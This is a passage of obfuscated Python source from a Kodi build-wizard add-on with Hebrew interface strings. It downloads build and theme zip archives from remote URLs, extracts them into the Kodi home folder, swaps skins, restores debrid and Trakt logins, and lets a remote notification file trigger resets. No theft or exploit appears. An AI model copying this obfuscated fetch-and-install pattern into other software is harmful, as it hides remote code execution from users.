		except :#line:4497
				pass #line:4498
		swapSkins ('skin.Premium.mod')#line:4499
def buildWizard (OOO0OOO0OOO00O00O ,O00O0OOO00O00O000 ,theme =None ,over =False ):#line:4502
	OO00O000OO00OO00O =xbmcgui .DialogBusy ()#line:4503
	OO00O000OO00OO00O .create ()#line:4504
	if over ==False :#line:4505
		OO00OOO00OO000OO0 =wiz .checkBuild (OOO0OOO0OOO00O00O ,'url')#line:4506
		if USERNAME =='':#line:4507
			ADDON .openSettings ()#line:4508
			sys .exit ()#line:4509
		if PASSWORD =='':#line:4510
			ADDON .openSettings ()#line:4511
			sys .exit ()#line:4512
		if BUILDNAME =='':#line:4514
			O0O00O00OO0000OO0 =u_list (SPEEDFILE )#line:4515
			(O0O00O00OO0000OO0 )#line:4516
		if OO00OOO00OO000OO0 ==False :#line:4517
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:4522
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:4523
			return #line:4524
		O0OOO00OO00OOO00O =wiz .workingURL (OO00OOO00OO000OO0 )#line:4525
		if O0OOO00OO00OOO00O ==False :#line:4526
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OOO00OO00OOO00O ))#line:4527
			return #line:4528
	if O00O0OOO00O00O000 =='gui':#line:4529
		if OOO0OOO0OOO00O00O ==BUILDNAME :#line:4530
			if over ==True :O000OO0OO000OOO00 =1 #line:4531
			else :O000OO0OO000OOO00 =1 #line:4532
		else :#line:4533
			O000OO0OO000OOO00 =1 #line:4534
		if O000OO0OO000OOO00 :#line:4535
			remove_addons ()#line:4536
			remove_addons2 ()#line:4537
			debridit .debridIt ('update','all')#line:4538
			traktit .traktIt ('update','all')#line:4539
			OOO000OOOOO0OO0O0 =wiz .checkBuild (OOO0OOO0OOO00O00O ,'gui')#line:4540
			O00OOOO0OO0OO0OO0 =OOO0OOO0OOO00O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4541
			if not wiz .workingURL (OOO000OOOOO0OO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4542
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4543
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O00O ),'','אנא המתן')#line:4544
			OO0O00OOO00OO0000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OOOO0OO0OO0OO0 )#line:4545
			try :os .remove (OO0O00OOO00OO0000 )#line:4546
			except :pass #line:4547
			logging .warning (OOO000OOOOO0OO0O0 )#line:4548
			O00OO00OOOOOO00O0 ='עדכון מערכת'#line:4549
			if 'google'in OOO000OOOOO0OO0O0 :#line:4550
			   O0O0OO0000OOO0000 =googledrive_download (OOO000OOOOO0OO0O0 ,OO0O00OOO00OO0000 ,DP ,wiz .checkBuild (OOO0OOO0OOO00O00O ,'updatesize'))#line:4552
			else :#line:4555
			  downloader .download (OOO000OOOOO0OO0O0 ,OO0O00OOO00OO0000 ,DP )#line:4556
			xbmc .sleep (100 )#line:4557
			O0000OO000OO0OO0O ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO00OOOOOO00O0 )#line:4558
			DP .update (0 ,O0000OO000OO0OO0O ,'','אנא המתן')#line:4559
			extract .all (OO0O00OOO00OO0000 ,HOME ,DP ,title =O0000OO000OO0OO0O )#line:4560
			DP .close ()#line:4561
			wiz .defaultSkin ()#line:4562
			wiz .lookandFeelData ('save')#line:4563
			try :#line:4564
				telemedia_android5fix ()#line:4565
			except :pass #line:4566
			wiz .kodi17Fix ()#line:4567
			if KODIV >=18 :#line:4568
				skindialogsettind18 ()#line:4569
			debridit .debridIt ('restore','all')#line:4570
			traktit .traktIt ('restore','all')#line:4571
			if INSTALLMETHOD ==1 :OO0OO0O0OOO00OOOO =1 #line:4573
			elif INSTALLMETHOD ==2 :OO0OO0O0OOO00OOOO =0 #line:4574
			else :DP .close ()#line:4575
			O0O0O0OO0000O00OO =(NOTIFICATION2 )#line:4576
			O0OOO0O00O0O0O000 =urllib2 .urlopen (O0O0O0OO0000O00OO )#line:4577
			O000O000000OOOO0O =O0OOO0O00O0O0O000 .readlines ()#line:4578
			O00O00OOO0O00OOOO =0 #line:4579
			for O00OO0OOOO0O000OO in O000O000000OOOO0O :#line:4582
				if O00OO0OOOO0O000OO .split (' ==')[0 ]=="noreset"or O00OO0OOOO0O000OO .split ()[0 ]=="noreset":#line:4583
					xbmc .executebuiltin ("ReloadSkin()")#line:4585
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:4586
					update_Votes ()#line:4587
					indicatorfastupdate ()#line:4588
				if O00OO0OOOO0O000OO .split (' ==')[0 ]=="reset"or O00OO0OOOO0O000OO .split ()[0 ]=="reset":#line:4589
					update_Votes ()#line:4591
					indicatorfastupdate ()#line:4592
					resetkodi ()#line:4593
		else :#line:4602
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4603
	if O00O0OOO00O00O000 =='gui2':#line:4604
		if OOO0OOO0OOO00O00O ==BUILDNAME :#line:4605
			if over ==True :O000OO0OO000OOO00 =1 #line:4606
			else :O000OO0OO000OOO00 =1 #line:4607
		else :#line:4608
			O000OO0OO000OOO00 =1 #line:4609
		if O000OO0OO000OOO00 :#line:4610
			remove_addons ()#line:4611
			remove_addons2 ()#line:4612
			OOO000OOOOO0OO0O0 =wiz .checkBuild (OOO0OOO0OOO00O00O ,'gui')#line:4613
			O00OOOO0OO0OO0OO0 =OOO0OOO0OOO00O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4614
			if not wiz .workingURL (OOO000OOOOO0OO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4615
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4616
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O00O ),'','אנא המתן')#line:4617
			OO0O00OOO00OO0000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OOOO0OO0OO0OO0 )#line:4618
			try :os .remove (OO0O00OOO00OO0000 )#line:4619
			except :pass #line:4620
			logging .warning (OOO000OOOOO0OO0O0 )#line:4621
			if 'google'in OOO000OOOOO0OO0O0 :#line:4622
			   O0O0OO0000OOO0000 =googledrive_download (OOO000OOOOO0OO0O0 ,OO0O00OOO00OO0000 ,DP ,wiz .checkBuild (OOO0OOO0OOO00O00O ,'updatesize'))#line:4623
			else :#line:4626
			  downloader .download (OOO000OOOOO0OO0O0 ,OO0O00OOO00OO0000 ,DP )#line:4627
			xbmc .sleep (100 )#line:4628
			O0000OO000OO0OO0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O00O )#line:4629
			DP .update (0 ,O0000OO000OO0OO0O ,'','אנא המתן')#line:4630
			extract .all (OO0O00OOO00OO0000 ,HOME ,DP ,title =O0000OO000OO0OO0O )#line:4631
			DP .close ()#line:4632
			wiz .defaultSkin ()#line:4633
			wiz .lookandFeelData ('save')#line:4634
			if INSTALLMETHOD ==1 :OO0OO0O0OOO00OOOO =1 #line:4637
			elif INSTALLMETHOD ==2 :OO0OO0O0OOO00OOOO =0 #line:4638
			else :DP .close ()#line:4639
		else :#line:4641
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4642
	elif O00O0OOO00O00O000 =='fresh':#line:4643
		xbmc .executebuiltin ("ActivateWindow(home)")#line:4644
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מאמת התחברות, אנא המתן.[/COLOR]'%COLOR2 )#line:4645
		freshStart (OOO0OOO0OOO00O00O )#line:4647
	elif O00O0OOO00O00O000 =='normal':#line:4648
		if url =='normal':#line:4649
			if KEEPTRAKT =='true':#line:4650
				traktit .autoUpdate ('all')#line:4651
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4652
			if KEEPREAL =='true':#line:4653
				debridit .autoUpdate ('all')#line:4654
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4655
			if KEEPLOGIN =='true':#line:4656
				loginit .autoUpdate ('all')#line:4657
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4658
		OO00O0O00OO000O00 =int (KODIV );OO00O0OO0O00O00O0 =int (float (wiz .checkBuild (OOO0OOO0OOO00O00O ,'kodi')))#line:4659
		if not OO00O0O00OO000O00 ==OO00O0OO0O00O00O0 :#line:4660
			if OO00O0O00OO000O00 ==16 and OO00O0OO0O00O00O0 <=15 :OOO0OO0OO0OOOO000 =False #line:4661
			else :OOO0OO0OO0OOOO000 =True #line:4662
		else :OOO0OO0OO0OOOO000 =False #line:4663
		if OOO0OO0OO0OOOO000 ==True :#line:4664
			OOO0OOO00OOOOOO00 =1 #line:4665
		else :#line:4666
			if not over ==False :OOO0OOO00OOOOOO00 =1 #line:4667
			else :OOO0OOO00OOOOOO00 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4668
		if OOO0OOO00OOOOOO00 :#line:4669
			wiz .clearS ('build')#line:4670
			OOO000OOOOO0OO0O0 =wiz .checkBuild (OOO0OOO0OOO00O00O ,'url')#line:4671
			O00OOOO0OO0OO0OO0 =OOO0OOO0OOO00O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4672
			if not wiz .workingURL (OOO000OOOOO0OO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4673
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4674
			xbmc .log ("Platform is: %s."%(ADDONTITLE ),5 )#line:4676
			DP .create (ADDONTITLE ,'[B]Downloading:[/B][COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O00O ,wiz .checkBuild (OOO0OOO0OOO00O00O ,'version')),'','Please Wait')#line:4677
			OO0O00OOO00OO0000 =os .path .join (PACKAGES ,'%s.zip'%O00OOOO0OO0OO0OO0 )#line:4678
			try :os .remove (OO0O00OOO00OO0000 )#line:4679
			except :pass #line:4680
			logging .warning (OOO000OOOOO0OO0O0 )#line:4681
			if 'google'in OOO000OOOOO0OO0O0 :#line:4682
			   O0O0OO0000OOO0000 =googledrive_download (OOO000OOOOO0OO0O0 ,OO0O00OOO00OO0000 ,DP ,wiz .checkBuild (OOO0OOO0OOO00O00O ,'filesize'))#line:4683
			else :#line:4686
			  downloader .download (OOO000OOOOO0OO0O0 ,OO0O00OOO00OO0000 ,DP )#line:4687
			xbmc .sleep (1000 )#line:4688
			O0000OO000OO0OO0O ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O00O ,wiz .checkBuild (OOO0OOO0OOO00O00O ,'version'))#line:4689
			DP .update (0 ,O0000OO000OO0OO0O ,'','אנא המתן...')#line:4690
			O0OO00OO0O0OOOO0O ,OO0OOO0OO00000O0O ,OO0OOOOOOOO0O00OO =extract .all (OO0O00OOO00OO0000 ,HOME ,DP ,title =O0000OO000OO0OO0O )#line:4691
			if int (float (O0OO00OO0O0OOOO0O ))>0 :#line:4692
				try :#line:4693
					wiz .fixmetas ()#line:4694
				except :pass #line:4695
				wiz .lookandFeelData ('save')#line:4696
				wiz .defaultSkin ()#line:4697
				wiz .setS ('buildname',OOO0OOO0OOO00O00O )#line:4699
				wiz .setS ('buildversion',wiz .checkBuild (OOO0OOO0OOO00O00O ,'version'))#line:4700
				wiz .setS ('buildtheme','')#line:4701
				wiz .setS ('latestversion',wiz .checkBuild (OOO0OOO0OOO00O00O ,'version'))#line:4702
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4703
				wiz .setS ('installed','true')#line:4704
				wiz .setS ('extract',str (O0OO00OO0O0OOOO0O ))#line:4705
				wiz .setS ('errors',str (OO0OOO0OO00000O0O ))#line:4706
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO00OO0O0OOOO0O ,OO0OOO0OO00000O0O ))#line:4707
				fastupdatefirstbuild (NOTEID )#line:4708
				try :#line:4709
					telemedia_android5fix ()#line:4710
				except :pass #line:4711
				wiz .kodi17Fix ()#line:4712
				skin_homeselect ()#line:4713
				if len (ADDON .getSetting ("sync_user"))>0 :#line:4714
					xbmc .sleep (1500 )#line:4715
					user_sync ()#line:4716
					xbmc .sleep (12000 )#line:4717
				kodi17to18 ()#line:4724
				try :os .remove (OO0O00OOO00OO0000 )#line:4726
				except :pass #line:4727
				DP .close ()#line:4747
				O00O0OO00OOOOOOO0 =wiz .themeCount (OOO0OOO0OOO00O00O )#line:4748
				builde_Votes ()#line:4749
				indicator ()#line:4750
				indicatorVotes ()#line:4751
				if not O00O0OO00OOOOOOO0 ==False :#line:4752
					buildWizard (OOO0OOO0OOO00O00O ,'theme')#line:4753
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4754
				if INSTALLMETHOD ==1 :OO0OO0O0OOO00OOOO =1 #line:4755
				elif INSTALLMETHOD ==2 :OO0OO0O0OOO00OOOO =0 #line:4756
				else :resetkodi ()#line:4757
				if OO0OO0O0OOO00OOOO ==1 :wiz .reloadFix ()#line:4759
				else :wiz .killxbmc (True )#line:4760
			else :#line:4761
				if isinstance (OO0OOO0OO00000O0O ,unicode ):#line:4762
					OO0OOOOOOOO0O00OO =OO0OOOOOOOO0O00OO .encode ('utf-8')#line:4763
				OOOO0OO0O00OO000O =open (OO0O00OOO00OO0000 ,'r')#line:4764
				O000O0O0OOO000OOO =OOOO0OO0O00OO000O .read ()#line:4765
				O0O0O0O0OOOO00OOO =''#line:4766
				for OO00OOO0OO000OO0O in O0O0OO0000OOO0000 :#line:4767
				  O0O0O0O0OOOO00OOO ='key: '+O0O0O0O0OOOO00OOO +'\n'+OO00OOO0OO000OO0O #line:4768
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'בעיה בהתקנה'),'[COLOR %s]יש לשנות את התאריך ליום אחד קודם[/COLOR]'%COLOR2 )#line:4769
		else :#line:4771
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4772
	elif O00O0OOO00O00O000 =='theme':#line:4773
		if theme ==None :#line:4774
			O00O0OO00OOOOOOO0 =wiz .checkBuild (OOO0OOO0OOO00O00O ,'theme')#line:4775
			OOO0000OOOOOOO0OO =[]#line:4776
			if not O00O0OO00OOOOOOO0 =='http://'and wiz .workingURL (O00O0OO00OOOOOOO0 )==True :#line:4777
				OOO0000OOOOOOO0OO =wiz .themeCount (OOO0OOO0OOO00O00O ,False )#line:4778
				if len (OOO0000OOOOOOO0OO )>0 :#line:4779
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOO0OOO0OOO00O00O ,COLOR1 ,len (OOO0000OOOOOOO0OO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4780
						wiz .log ("Theme List: %s "%str (OOO0000OOOOOOO0OO ))#line:4781
						OOOOOO00OO00000OO =DIALOG .select (ADDONTITLE ,OOO0000OOOOOOO0OO )#line:4782
						wiz .log ("Theme install selected: %s"%OOOOOO00OO00000OO )#line:4783
						if not OOOOOO00OO00000OO ==-1 :theme =OOO0000OOOOOOO0OO [OOOOOO00OO00000OO ];O00O0OOOOOOO0OO0O =True #line:4784
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4785
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4786
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4787
		else :O00O0OOOOOOO0OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOO0OOO0OOO00O00O ,wiz .checkBuild (OOO0OOO0OOO00O00O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4788
		if O00O0OOOOOOO0OO0O :#line:4789
			O00O0O0000O0OOO00 =wiz .checkTheme (OOO0OOO0OOO00O00O ,theme ,'url')#line:4790
			O00OOOO0OO0OO0OO0 =OOO0OOO0OOO00O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4791
			if not wiz .workingURL (O00O0O0000O0OOO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4792
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4793
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4794
			OO0O00OOO00OO0000 =os .path .join (PACKAGES ,'%s.zip'%O00OOOO0OO0OO0OO0 )#line:4795
			try :os .remove (OO0O00OOO00OO0000 )#line:4796
			except :pass #line:4797
			downloader .download (O00O0O0000O0OOO00 ,OO0O00OOO00OO0000 ,DP )#line:4798
			xbmc .sleep (1000 )#line:4799
			DP .update (0 ,"","Installing %s "%OOO0OOO0OOO00O00O )#line:4800
			O0O000OO0O00OOO00 =False #line:4801
			if url not in ["fresh","normal"]:#line:4802
				O0O000OO0O00OOO00 =testTheme (OO0O00OOO00OO0000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4803
				O0OO0OOOOOO00OOO0 =testGui (OO0O00OOO00OO0000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4804
				if O0O000OO0O00OOO00 ==True :#line:4805
					wiz .lookandFeelData ('save')#line:4806
					OOOOOOO000OOO0000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4807
					O00OO00O0OOO0000O =xbmc .getSkinDir ()#line:4808
					skinSwitch .swapSkins (OOOOOOO000OOO0000 )#line:4810
					O000O000000OOOO0O =0 #line:4811
					xbmc .sleep (1000 )#line:4812
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000000OOOO0O <150 :#line:4813
						O000O000000OOOO0O +=1 #line:4814
						xbmc .sleep (1000 )#line:4815
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4816
						wiz .ebi ('SendClick(11)')#line:4817
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4818
					xbmc .sleep (1000 )#line:4819
			O0000OO000OO0OO0O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4820
			DP .update (0 ,O0000OO000OO0OO0O ,'','אנא המתן')#line:4821
			O0OO00OO0O0OOOO0O ,OO0OOO0OO00000O0O ,OO0OOOOOOOO0O00OO =extract .all (OO0O00OOO00OO0000 ,HOME ,DP ,title =O0000OO000OO0OO0O )#line:4822
			wiz .setS ('buildtheme',theme )#line:4823
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OO00OO0O0OOOO0O ,OO0OOO0OO00000O0O ))#line:4824
			DP .close ()#line:4825
			if url not in ["fresh","normal"]:#line:4826
				wiz .forceUpdate ()#line:4827
				if KODIV >=17 :wiz .kodi17Fix ()#line:4828
				if O0OO0OOOOOO00OOO0 ==True :#line:4829
					wiz .lookandFeelData ('save')#line:4830
					wiz .defaultSkin ()#line:4831
					O00OO00O0OOO0000O =wiz .getS ('defaultskin')#line:4832
					skinSwitch .swapSkins (O00OO00O0OOO0000O )#line:4833
					O000O000000OOOO0O =0 #line:4834
					xbmc .sleep (1000 )#line:4835
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000000OOOO0O <150 :#line:4836
						O000O000000OOOO0O +=1 #line:4837
						xbmc .sleep (1000 )#line:4838
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4840
						wiz .ebi ('SendClick(11)')#line:4841
					wiz .lookandFeelData ('restore')#line:4842
				elif O0O000OO0O00OOO00 ==True :#line:4843
					skinSwitch .swapSkins (O00OO00O0OOO0000O )#line:4844
					O000O000000OOOO0O =0 #line:4845
					xbmc .sleep (1000 )#line:4846
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000000OOOO0O <150 :#line:4847
						O000O000000OOOO0O +=1 #line:4848
						xbmc .sleep (1000 )#line:4849
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4851
						wiz .ebi ('SendClick(11)')#line:4852
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4853
					wiz .lookandFeelData ('restore')#line:4854
				else :#line:4855
					wiz .ebi ("ReloadSkin()")#line:4856
					xbmc .sleep (1000 )#line:4857
					wiz .ebi ("Container.Refresh")#line:4858
		else :#line:4859
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4860
def skin_homeselect ():#line:4864
	try :#line:4866
		OOOO0O00OO0OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4867
		O0000OOOO00O0O00O =open (OOOO0O00OO0OOO0OO ,'r')#line:4869
		O00O0O0O0000O0OOO =O0000OOOO00O0O00O .read ()#line:4870
		O0000OOOO00O0O00O .close ()#line:4871
		O00OO0OOOOO000OOO ='<setting id="FirstRunSetup" type="bool(.+?)/setting>'#line:4872
		OOO0O00OO00O0000O =re .compile (O00OO0OOOOO000OOO ).findall (O00O0O0O0000O0OOO )[0 ]#line:4873
		O0000OOOO00O0O00O =open (OOOO0O00OO0OOO0OO ,'w')#line:4874
		O0000OOOO00O0O00O .write (O00O0O0O0000O0OOO .replace ('<setting id="FirstRunSetup" type="bool%s/setting>'%OOO0O00OO00O0000O ,'<setting id="FirstRunSetup" type="bool"></setting>'))#line:4875
		O0000OOOO00O0O00O .close ()#line:4876
	except :#line:4877
		pass #line:4878
def skin_lower ():#line:4881
	OO000OO0O0OOO0000 =(ADDON .getSetting ("lower"))#line:4882
	if OO000OO0O0OOO0000 =='true':#line:4883
		try :#line:4886
			O00OO000OOOOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4887
			O0O000000OO000O00 =open (O00OO000OOOOOO00O ,'r')#line:4889
			OO0OOO0OOO00OOOOO =O0O000000OO000O00 .read ()#line:4890
			O0O000000OO000O00 .close ()#line:4891
			OOOO00OO000OO0000 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4892
			OO0OO000OO000O000 =re .compile (OOOO00OO000OO0000 ).findall (OO0OOO0OOO00OOOOO )[0 ]#line:4893
			O0O000000OO000O00 =open (O00OO000OOOOOO00O ,'w')#line:4894
			O0O000000OO000O00 .write (OO0OOO0OOO00OOOOO .replace ('<setting id="none_widget" type="bool%s/setting>'%OO0OO000OO000O000 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4895
			O0O000000OO000O00 .close ()#line:4896
		except :#line:4962
			pass #line:4963
def thirdPartyInstall (O00OO0000O000O0OO ,OOOO0O00O00O00000 ):#line:4965
	if not wiz .workingURL (OOOO0O00O00O00000 ):#line:4966
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4967
	O0O00O000OOO0OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0000O000O0OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4968
	if O0O00O000OOO0OO00 ==1 :#line:4969
		freshStart ('third',True )#line:4970
	wiz .clearS ('build')#line:4971
	O00000000000000OO =O00OO0000O000O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4972
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4973
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0000O000O0OO ),'','אנא המתן')#line:4974
	OOO00000O00O0O0OO =os .path .join (PACKAGES ,'%s.zip'%O00000000000000OO )#line:4975
	try :os .remove (OOO00000O00O0O0OO )#line:4976
	except :pass #line:4977
	downloader .download (OOOO0O00O00O00000 ,OOO00000O00O0O0OO ,DP )#line:4978
	xbmc .sleep (1000 )#line:4979
	O000OOO0OOOO00O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0000O000O0OO )#line:4980
	DP .update (0 ,O000OOO0OOOO00O0O ,'','אנא המתן')#line:4981
	OOOOO0O00OOO00O00 ,O00OO0000OO0O00OO ,O0OO0000OOO00OOOO =extract .all (OOO00000O00O0O0OO ,HOME ,DP ,title =O000OOO0OOOO00O0O )#line:4982
	if int (float (OOOOO0O00OOO00O00 ))>0 :#line:4983
		wiz .fixmetas ()#line:4984
		wiz .lookandFeelData ('save')#line:4985
		wiz .defaultSkin ()#line:4986
		wiz .setS ('installed','true')#line:4988
		wiz .setS ('extract',str (OOOOO0O00OOO00O00 ))#line:4989
		wiz .setS ('errors',str (O00OO0000OO0O00OO ))#line:4990
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOOO0O00OOO00O00 ,O00OO0000OO0O00OO ))#line:4991
		try :os .remove (OOO00000O00O0O0OO )#line:4992
		except :pass #line:4993
		if int (float (O00OO0000OO0O00OO ))>0 :#line:4994
			OOO0OOOOO0O0OO0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0000O000O0OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOOO0O00OOO00O00 ,'%',COLOR1 ,O00OO0000OO0O00OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4995
			if OOO0OOOOO0O0OO0OO :#line:4996
